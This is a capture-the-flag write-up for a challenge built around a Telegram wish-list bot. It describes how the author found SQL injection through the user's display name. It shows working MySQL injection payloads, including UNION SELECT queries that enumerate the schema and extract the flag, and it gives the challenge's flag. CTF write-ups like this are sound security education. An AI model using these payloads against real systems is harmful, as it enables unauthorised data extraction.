# Day 12: SmartWishList

## Challenge text

```
Santa's being really innovative this year!

Send your wishes directly over your favorite messenger (telegram):
@smartwishlist_bot
```

## Solution

I've first tried to generated unexpected responses via unexpected/malicious
input (negative numbers, big numbers, \0, $(), `<script></script>`, etc.).

Didn't work, finally thought about how the wishes are stored -> SQL

Wish to big:
(1406, "Data too long for column 'wish' at row 127")

Temporary error message from the server:
(1292, "Truncated incorrect DOUBLE value: '5.7.20'")

Conclusion: Seems to be MySQL

The following is ok:
/addwish 012345678901234567890123456789012345678901234
Too long:
/addwish 0123456789012345678901234567890123456789012345

45 characters are allowed for column "wish".

Can't figure out something useful with /removewish, etc.

I finally figured out that an SQL injection is possible by changing my name (not
the username). The bot uses the name to determine which wish belongs to which
user.

This took me a while to exploit as I'm not really familiar with SQL.

Name: ' OR (wish like "%HV");#'

But unfortunately the wish is not in this table.

Version - 5.7.20

' UNION SELECT 1,table_name from INFORMATION_SCHEMA.TABLES;#

- [...]
- 1 - SecretStore
- 1 - User
- 1 - Wish

' UNION SELECT 1,COLUMN_NAME from INFORMATION_SCHEMA.columns;#

- flag

Solution: ' UNION SELECT 1,flag from SecretStore;#

Flag: `HV18-M4k3-S0m3-R34L-N1c3-W15h`
